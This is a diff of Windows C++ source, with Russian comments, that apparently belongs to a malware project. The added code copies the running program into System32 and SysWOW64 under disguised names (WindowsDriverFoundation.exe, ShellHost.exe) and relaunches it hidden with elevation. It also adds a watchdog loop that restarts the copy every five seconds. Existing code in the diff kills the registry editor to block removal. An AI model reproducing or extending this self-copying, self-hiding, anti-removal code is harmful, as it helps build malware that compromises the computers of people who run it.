@@ -129,25 +129,23 @@ void restartAsAdmin() {
     }
 }
 
-bool copyAndRunSelf() {
+int copyAndRunSelf() {
     // Путь к текущему исполняемому файлу
     char path[MAX_PATH];
     GetModuleFileName(NULL, path, MAX_PATH);
-
-    // куда мы будем копировать программу
-    const char* targetDirectory = "C:\\Windows\\SysWOW64\\";
-    const char* targetFile = "WindowsDriverFoundation.exe";
-    char destination[MAX_PATH];
-    strcpy_s(destination, MAX_PATH, targetDirectory);
-    strcat_s(destination, MAX_PATH, targetFile);
-
-    // Проверяем находится программа уже в C:\Windows\SysWOW64
-    if (strstr(path, targetDirectory) != NULL) {
+    
+    // Проверяем, находится ли программа уже в C:\Windows\SysWOW64
+    if (strstr(path, "C:\\Windows\\SysWOW64\\") != NULL) {
         return 0;
     }
-    // копируем и запусскаем
-    CopyFile(path, destination, FALSE);
-    ShellExecute(NULL, "open", destination, NULL, NULL, SW_HIDE);
+    if (strstr(path, "C:\\Windows\\System32\\") != NULL) {
+        return 2;
+    }
+    // Копируем и запускаем
+    CopyFile(path, "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe", FALSE);
+    ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe", NULL, NULL, SW_HIDE);
+    CopyFile(path, "C:\\Windows\\System32\\ShellHost.exe", FALSE);
+    ShellExecute(NULL, "runas", "C:\\Windows\\System32\\ShellHost.exe", NULL, NULL, SW_HIDE);
     return 1;
 }
 
@@ -204,6 +202,34 @@ void StopExe() {
         system("taskkill /F /IM regedit.exe >nul 2>&1");  // Закрываем редактор реестра
         // system("taskkill /F /IM explorer.exe >nul 2>&1"); // Временно 
         std::this_thread::sleep_for(std::chrono::milliseconds(300));
+    }
+}
+bool isProcessRunning(const char* exeName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE)
+        return false;
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, exeName) == 0) {
+                CloseHandle(hSnap);
+                return true;
+            }
+        } while (Process32Next(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return false;
+}
+void watchdogLoop() {
+    const char* targetPath = "C:\\Windows\\SysWOW64\\WindowsDriverFoundation.exe";
+    const char* exeName = "WindowsDriverFoundation.exe";
+
+    while (true) {
+        if (!isProcessRunning(exeName)) {
+            ShellExecuteA(NULL, "open", targetPath, NULL, NULL, SW_SHOW);
+        }
+        Sleep(5000);
     }
 }
 
